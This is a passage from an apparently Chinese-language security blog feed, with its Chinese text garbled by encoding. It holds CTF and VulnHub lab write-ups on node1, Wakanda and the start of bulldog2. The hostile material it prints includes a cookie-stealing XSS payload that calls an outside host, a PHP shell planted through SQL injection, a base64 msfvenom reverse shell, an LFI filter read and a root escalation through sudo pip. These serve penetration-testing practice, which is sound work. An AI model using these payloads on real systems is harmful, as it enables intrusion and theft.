class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    temp = hashlib.md5()</span><br><span class="line">    temp.update(<span class="built_in">str</span>(src).encode())</span><br><span class="line">    <span class="keyword">return</span> temp.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[:<span class="number">6</span>] == res:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    u = requests.session()</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://139.199.223.182:2000/admin.php&#x27;</span>)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    code = re.findall(<span class="string">r&quot;, 0, 6\) === â€œ([^â€]+)â€&quot;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    check = calc(code)</span><br><span class="line">    post = <span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">    data = &#123;<span class="string">&#x27;post&#x27;</span> : post, <span class="string">&#x27;check&#x27;</span> : check&#125;</span><br><span class="line">    r = u.post(<span class="string">&#x27;http://139.199.223.182:2000/admin.php&#x27;</span>, data = data)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    res = re.findall(<span class="string">&#x27;ä½ çš„æ–‡ç« å‘è¡¨åœ¨äº† \.([^&lt;]+)&lt;/div&gt;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://139.199.223.182:2000&#x27;</span> + res)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>æäº¤ä¸€ä¸‹å®ä½“å­—ç¬¦,å‘ç°æ²¡è¿‡æ»¤,é‚£ç”¨å®ä½“xsså°±ok xsså¹³å°ä¸Šé¢æ–°å»ºä¸€ä¸ªé¡¹ç›®,ç„¶åæäº¤evaléƒ¨åˆ† æ ·ä¾‹payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=eval(atob(&#x27;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL3BhWmlzaj8nK01hdGgucmFuZG9tKCk=&#x27;))&gt;</span><br></pre></td></tr></table></figure><p>ä¸­é—´çš„base64æ¢æˆè‡ªå·±çš„payload ç„¶ååœ¨cookieæ‹¿åˆ°flag</p><h2 id="whitebox-or-blackbox">WhiteBox or BlackBox?</h2><p>suctfåŸé¢˜...å‚è€ƒé“¾æ¥:<a href="http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/" title="http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/">http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/</a> è§£æå¯ä»¥å‚è€ƒæˆ‘suctfçš„æ–‡ç« ,ä¹Ÿå¯ä»¥è‡ªå·±æ‰¾å…¶ä»–å¸ˆå‚…çš„æ–‡ç«  è¿™é‡Œæˆ‘è¿˜æ˜¯ç”¨äºŒæ¬¡æ³¨å…¥åšçš„ æ³¨å†Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¸å·:<span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[d]`;<span class="meta">?&gt;</span></span><br><span class="line">å¯†ç :éšæ„</span><br></pre></td></tr></table></figure><p>è‡ªåŠ¨ç™»å½•ä¹‹åæ³¨é”€æ‰ ç„¶åæ³¨å†Œä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¸å·:<span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[e]`;<span class="meta">?&gt;</span><span class="string">&#x27;into outfile&#x27;</span>/<span class="keyword">var</span>/www/html/favicon/<span class="number">4</span>.php</span><br><span class="line">å¯†ç :éšæ„</span><br></pre></td></tr></table></figure><p>è‡ªåŠ¨ç™»å½•ä¹‹åæ³¨é”€ç„¶åå†ç™»å½•,æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯,è¯­å¥å¾—åˆ°æ‰§è¡Œ <a href="/images/2018/09/QQæˆªå›¾20181013021854.jpg"><img src="/images/2018/09/QQæˆªå›¾20181013021854.jpg" /></a> è¿™ä¸ªæ—¶å€™å·²ç»å†™å¥½äº†shell,ç›´æ¥è·‘å°±ok ç”¨çš„å‰é¢å­¦çš„çŸ­æ‹¬å·è¿”å›ä¿¡æ¯,å¯ä»¥å›æ˜¾å‘½ä»¤æ‰§è¡Œ <a href="/images/2018/09/QQæˆªå›¾20181013022143.jpg"><img src="/images/2018/09/QQæˆªå›¾20181013022143.jpg" /></a> æ ¹ç›®å½•æ‹¿åˆ°flag <a href="/images/2018/09/QQæˆªå›¾20181013022305.jpg"><img src="/images/2018/09/QQæˆªå›¾20181013022305.jpg" /></a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€å­¦ä¹ (node1)</title>
      <link href="/2018/09/18/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0node1/"/>
      <url>/2018/09/18/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0node1/</url>
      
        <content type="html"><![CDATA[<h1 id="node1">node1</h1><h2 id="é¶æœºä¸‹è½½å’Œä»‹ç»">é¶æœºä¸‹è½½å’Œä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/node-1,252/" title="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a></p><h2 id="ipå’Œç«¯å£ä¿¡æ¯">ipå’Œç«¯å£ä¿¡æ¯</h2><p>é¶æœºip:172.20.10.2<br />æ‰«æä¿¡æ¯<br /><img src="/images/2018/09/2018-09-18-09-09-19å±å¹•æˆªå›¾.png" /></p><h2 id="webæœåŠ¡">webæœåŠ¡</h2><p>è®¿é—®ä¸€ä¸‹ä¸»é¡µé¢,æŠ“ä¸€ä¸‹æ•°æ®åŒ…,å‘ç°ä¸€ä¸ªxhr,é‡Œé¢åŒ…å«å¯†ç <br /><img src="/images/2018/09/2018-09-18-09-24-27å±å¹•æˆªå›¾.png" /> cmd5è§£ä¸€ä¸‹<br /><img src="/images/2018/09/2018-09-18-09-26-46å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> ç™»å½•ä¸Šå»ä¹‹åå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯<br /><img src="/images/2018/09/2018-09-18-09-28-26å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> æ— æ„ä¸­åˆ æ‰lateset,è®¿é—®<code>http://172.20.10.2:3000/api/users</code> å‘ç°å¾—åˆ°äº†æ•°æ®åº“é‡Œçš„å…¨éƒ¨ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true&#125;,&#123;&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false&#125;,&#123;&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false&#125;,&#123;&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false&#125;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ç®¡ç†å‘˜å¸å·ç™»å½•,å‘ç°å¯ä»¥ä¸‹è½½backupæ–‡ä»¶<br /><img src="/images/2018/09/2018-09-18-09-31-58å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> çœ‹ä¸€ä¸‹å‘ç°æ˜¯base64,è§£ä¸€ä¸‹<br /><img src="/images/2018/09/2018-09-18-09-34-13å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> å‘ç°è§£å¯†ä¹‹åæ˜¯ä¸ªå‹ç¼©åŒ…,ä½†æ˜¯æœ‰å¯†ç ,è¯•äº†ä¸€äº›å¯†ç å‘ç°ä¸å¤ªå¯¹,ç”¨kalié»˜è®¤çš„rockyouè¯•äº†ä¸€ä¸‹,æ‹¿åˆ°å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~/Desktop$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace_decode.bak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == magicword</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unzipä¸‹æ¥,çœ‹ä¸»è¦éƒ¨åˆ†app.js,å¤§æ¦‚çœ‹äº†ä¸‹æºç ,å¹¶æ²¡æœ‰å‘ç°æ¼æ´,ä½†æ˜¯æœ‰ä¸€ä¸ªmongodbçš„å¯†ç  <img src="/images/2018/09/2018-09-18-09-40-40å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> æƒ³åˆ°ä¹‹å‰å¼€äº†ssh,è¿ä¸€ä¸‹,æ‹¿åˆ°äº†markç”¨æˆ·çš„shell <img src="/images/2018/09/2018-09-18-09-44-02å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /></p><h2 id="ææƒ">ææƒ</h2><p><code>sudo -l</code>å‘ç°ä¸æ˜¯sudoer,/etc/passwdä¸å¯å†™,ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºçš„å¯†ç ,æŸ¥æ‰¾äº†ä¸€ä¸‹å„ç”¨æˆ·çš„æ–‡ä»¶ä¹Ÿæ²¡æœ‰çªç ´å£... scpä¼ ä¸€ä¸‹æ¢æµ‹è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r /home/blacsheep/Tools/MyWebTools mark@172.20.10.2:/tmp/</span><br></pre></td></tr></table></figure><p>å¼€å§‹çš„æ—¶å€™æ‹¿è„ç‰›æ‰“äº†ä¸€ä¸‹,å‘ç°å¤±è´¥äº†,æ¢äº†ä¸ª18å¹´çš„ubuntu16.04çš„expæ‰“è¿‡å» <img src="/images/2018/09/2018-09-18-09-55-56å±å¹•æˆªå›¾.png" alt="&quot;blacsheep&quot;" /> æ‹¿åˆ°root</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€å­¦ä¹ (wakanda,bulldog2)</title>
      <link href="/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"/>
      <url>/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/</url>
      
        <content type="html"><![CDATA[<h1 id="wakanda1">wakanda:1</h1><h2 id="å®‰è£…å’Œä»‹ç»">å®‰è£…å’Œä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/wakanda-1,251/" title="https://www.vulnhub.com/entry/wakanda-1,251/">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="ipå’Œç«¯å£">ipå’Œç«¯å£</h2><p>é¶æœºip:192.168.1.102 ç«¯å£ä¿¡æ¯ <img src="/images/2018/09/2018-09-16-21-21-17å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="æ‹¿shell">æ‹¿shell</h2><p>å»80ç«¯å£çœ‹ä¸‹,å‘ç°æ²¡æœ‰å¯ä»¥å“åº”çš„ç½‘é¡µ <img src="/images/2018/09/2018-09-16-21-22-33å±å¹•æˆªå›¾.png" alt="blacsheep" /> dirbæ‰«ä¸€ä¸‹ <img src="/images/2018/09/2018-09-16-21-24-05å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¯ä»¥çœ‹åˆ°sizeéƒ½æ˜¯0,æ²¡çªç ´å£ å†å›å»çœ‹ç½‘é¡µæºç çš„æ—¶å€™å‘ç°æœ‰ä¸€è¡Œæ³¨é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¿é—®ä¸€ä¸‹,å‘ç°é¡µé¢ä¸ä¸€æ · <img src="/images/2018/09/2018-09-16-21-25-51å±å¹•æˆªå›¾.png" alt="blacsheep" /> çŒœæµ‹å­˜åœ¨æ–‡ä»¶åŒ…å«,å»çœ‹ä¸‹æœ‰æ²¡æœ‰fr.php,å‘ç°å­˜åœ¨ <img src="/images/2018/09/2018-09-16-21-27-11å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¯•è¯•æ–‡ä»¶åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# curl &quot;http://192.168.1.102/?lang=php://filter/read=convert.base64-encode/resource=index&quot;  base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3815  100  3815    0     0  3725k      0 --:--:-- --:--:-- --:--:-- 3725k</span><br><span class="line">&lt;?php</span><br><span class="line">$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&#x27;lang&#x27;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Vibranium Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;?php</span><br><span class="line">            if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">          &#123;</span><br><span class="line">          echo $message;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            ?&gt;</span><br><span class="line"></span><br><span class="line">            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!</span><br><span class="line">            &lt;?php</span><br><span class="line">          &#125;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸€ä¸ªå¯†ç ,å»è¯•è¯•ssh å¸å·å¯ä»¥ç”¨ä¹‹å‰é¡µé¢ä¸Šçš„mamadou <img src="/images/2018/09/2018-09-16-21-33-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åè¿ä¸Šå»äº† <img src="/images/2018/09/2018-09-16-21-34-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> æƒé™æ˜¯mamadou <img src="/images/2018/09/2018-09-16-21-36-51å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ">ææƒ</h2><p>å…ˆ<code>sudo -l</code>ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ sudo -l</span><br><span class="line">[sudo] password for mamadou: </span><br><span class="line">Sorry, user mamadou may not run sudo on Wakanda1.</span><br></pre></td></tr></table></figure><p>å¸å·æ²¡æœ‰sudoçš„æƒé™ æ‰¾ä¸€ä¸‹çº¿ç´¢,è¯»/etc/passwdå‘ç°ä¸€ä¸ªdevopsç”¨æˆ· æ‰¾ä¸‹è¿™ä¸ªç”¨æˆ·çš„æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ find / -user devops 2&gt;/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ªpyæ–‡ä»¶,çœ‹ä¸‹å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯å¼€æœºè¿è¡Œçš„è„šæœ¬,é‚£ä¹ˆçœ‹ä¸‹æƒé™èƒ½ä¸èƒ½å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/srv$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..</span><br><span class="line">-rw-r--rw-  1 devops developer  446 Sep 16 08:41 .antivirus.py</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶ä»–ç”¨æˆ·æœ‰å†™æƒé™,é‚£ä¹ˆç›´æ¥å†™è¿›æœ¨é©¬,ç”¨msfvenomç”Ÿæˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# msfvenom -p cmd/unix/reverse_python lhost=192.168.1.105 lport=4445 R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 497 bytes</span><br><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCAgICwgIHN1YnByb2Nlc3MgICAsICBvcyAgICAgOyAgICAgaG9zdD0iMTkyLjE2OC4xLjEwNSIgICAgIDsgICAgIHBvcnQ9NDQ0NSAgICAgOyAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICAgcy5jb25uZWN0KChob3N0ICAgLCAgcG9ydCkpICAgICA7ICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAwKSAgICAgOyAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgMSkgICAgIDsgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgIDIpICAgICA7ICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠexecçš„éƒ¨åˆ†å†™è¿›å» <img src="/images/2018/09/2018-09-16-22-04-09å±å¹•æˆªå›¾.png" alt="blacsheep" /> æœ¬åœ°ç›‘å¬ç„¶åé¶æœºé‡å¯ <img src="/images/2018/09/2018-09-16-22-06-12å±å¹•æˆªå›¾.png" alt="blacsheep" /> æ‹¿åˆ°devopsæƒé™,ç„¶å<code>sudo -l</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥rootæ‰§è¡Œpip,è¿™é‡Œæœ‰ä¸ªtrick,æœ‰ä¸ªå«åšFakepipçš„ä¸œè¥¿å¯ä»¥åå¼¹shell,github:<a href="https://github.com/0x00-0x00/FakePip" title="https://github.com/0x00-0x00/FakePip">https://github.com/0x00-0x00/FakePip</a> gloneä¸‹æ¥ä¹‹åæ”¹ä¸€ä¸‹ip,ç„¶åå†™ä¸ªwebshellæ–¹ä¾¿ä¼ æ–‡ä»¶,æˆ‘ä»¬è¿™é‡Œå†™åˆ°/tmpä¸‹é¢ <img src="/images/2018/09/2018-09-16-22-10-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åç›‘å¬å¥½,devopsæ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-16-22-12-44å±å¹•æˆªå›¾.png" alt="blacsheep" /> åå¼¹çš„shellåœ¨443æ”¶åˆ° <img src="/images/2018/09/2018-09-16-22-14-22å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h1 id="bulldog2">bulldog2</h1><h2 id="ä»‹ç»å’Œä¸‹è½½">ä»‹ç»å’Œä¸‹è½½</h2><p><a href="https://www.vulnhub.com/entry/bulldog-2,246/" title="https://www.vulnhub.com/entry/bulldog-2,246/">https://www.vulnhub.com/entry/bulldog-2,246/</a></p><h2 id="ipå’Œç«¯å£-1">ipå’Œç«¯å£</h2><p>é¶æœºip:192.168.43.121 æ‰«ç«¯å£ <img src="/images/2018/09/2018-09-17-14-51-00å±å¹•æˆªå›¾.png" alt="blacsheep" /> åªå¼€äº†80ç«¯å£</p><h2 id="è¿›ä¸€æ­¥ä¿¡æ¯æ”¶é›†">è¿›ä¸€æ­¥ä¿¡æ¯æ”¶é›†</h2><p>åªå¼€äº†80,é‚£æˆ‘ä»¬å»80ç«¯å£çœ‹ä¸‹ <img src="/images/2018/09/2018-09-17-14-52-46å±å¹•æˆªå›¾.png" alt="blacsheep" /> æµ‹è¯•ä¸€ä¸‹,å‘ç°å‡ ä¹æ²¡ä»€ä¹ˆåŠŸèƒ½,æ³¨å†Œä¹Ÿå…³é—­äº† åæ¥å»ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯é¡µé¢çš„æ—¶å€™å°è¯•æ³¨å…¥,ç»“æœå¾—åˆ°äº†é”™è¯¯å›æ˜¾ è®¿é—®é¡µé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.121/profile/lrberna%df&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-17-14-54-51å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°æ˜¯nodejs,ç„¶åå‘ç°webç›®å½•ä¸­çš„å…³é”®è¯<code>Bulldog-2-The-Reckoning</code> æˆ‘ä»¬å»githubæœä¸€ä¸‹ ç„¶åæ‰¾åˆ°åŸä»“åº“<a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning" title="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a> <img src="/images/2018/09/2018-09-17-14-56-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¼€å§‹ä»£ç å®¡è®¡</p><h2 